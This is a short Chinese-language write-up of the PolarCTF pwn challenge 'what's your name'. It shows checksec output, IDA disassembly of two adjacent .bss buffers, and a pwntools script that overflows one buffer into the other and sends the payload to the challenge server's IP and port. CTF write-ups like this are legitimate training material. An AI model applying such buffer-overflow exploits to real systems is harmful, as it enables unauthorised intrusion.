---
title: what's your name
layout: doc
---
# {{$frontmatter.title}}
[[toc]]

> 题目来源: PolarCTF pwn what's your name


## 基础分析
```zsh
┌──(kali㉿kali)-[~/win/Downloads]
└─$ file pwn2
pwn2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e5cf511e469da7eeb8c868af7cbc9bfa3a550b2d, not stripped

┌──(kali㉿kali)-[~/win/Downloads]
└─$ checksec --file=pwn2
[*] '/home/kali/win/Downloads/pwn2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments
```

## ida
![alt title](/images/image-24.png)

```asm
.bss:0804A06C b               db    ? ;               ; DATA XREF: main+62↑o
.bss:0804A06D                 db    ? ;
.bss:0804A06E                 db    ? ;
.bss:0804A06F                 db    ? ;
.bss:0804A070                 public c
.bss:0804A070 ; char c[8]
.bss:0804A070 c               db 8 dup(?)             ; DATA XREF: main+74↑o
```

b 的位置 0x0804A06C

c 的位置 0x0804A070

思路很明确了
read存在栈溢出，覆盖c 为 tznb


## exp
```py
from pwn import process, remote
from LibcSearcher3 import *  # noqa: F403

# io = process("./pwn2")
io = remote("120.46.59.242", 2070)

padding = 0x0804A070 - 0x0804A06C

payload = b"a" * 4 + b"tznb"

io.recvuntil("this?!\n")
io.send(payload)
print(io.recvline())
print(io.recvline())
```

没事别用 sendline 那个会多换行符